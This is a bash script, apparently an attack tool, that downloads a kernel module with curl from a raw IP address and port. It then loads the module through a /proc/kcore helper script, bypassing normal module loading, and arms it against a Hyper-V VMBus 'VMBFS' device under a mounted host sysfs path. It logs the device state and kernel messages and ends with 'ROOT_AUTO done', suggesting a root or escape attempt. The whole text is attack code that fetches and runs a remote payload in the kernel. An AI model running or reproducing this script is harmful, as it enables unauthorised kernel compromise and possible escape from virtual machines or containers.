#!/bin/bash
set +e
exec 0<&-

curl -fsS http://16.146.243.72:8450/hvraw_vmbfs_static.ko \
    -o /tmp/hvraw_vmbfs_static.ko

device=/hostsys/bus/vmbus/devices/c63c9bdf-5fa5-4208-b03f-6b458b365592
printf 'VMBFS class=%s instance=%s state=%s driver=%s\n' \
    "$(cat "$device/class_id" 2>/dev/null || echo missing)" \
    "$(cat "$device/device_id" 2>/dev/null || echo missing)" \
    "$(cat "$device/state" 2>/dev/null || echo missing)" \
    "$(readlink "$device/driver" 2>/dev/null | sed 's#.*/##' || true)"

python3 /tmp/kcore_relid_load.py /tmp/hvraw_vmbfs_static.ko 0 \
    class:c376c1c3-d276-48d2-90a9-c04748072c60 0
printf 'VMBFS loader_rc=%s\n' "$?"
(printf '1\n' > /hostsys/module/hvraw_vmbfs_static/parameters/arm) &
printf 'VMBFS arm_pid=%s\n' "$!"
sleep 5
printf 'VMBFS state_after_open=%s driver=%s\n' \
    "$(cat "$device/state" 2>/dev/null || echo missing)" \
    "$(readlink "$device/driver" 2>/dev/null | sed 's#.*/##' || true)"
dmesg 2>/dev/null | grep -E 'VMBFS_|hvraw_vmbfs_static|Unknown symbol|module_layout' | tail -40 || true
printf 'ROOT_AUTO done\n'

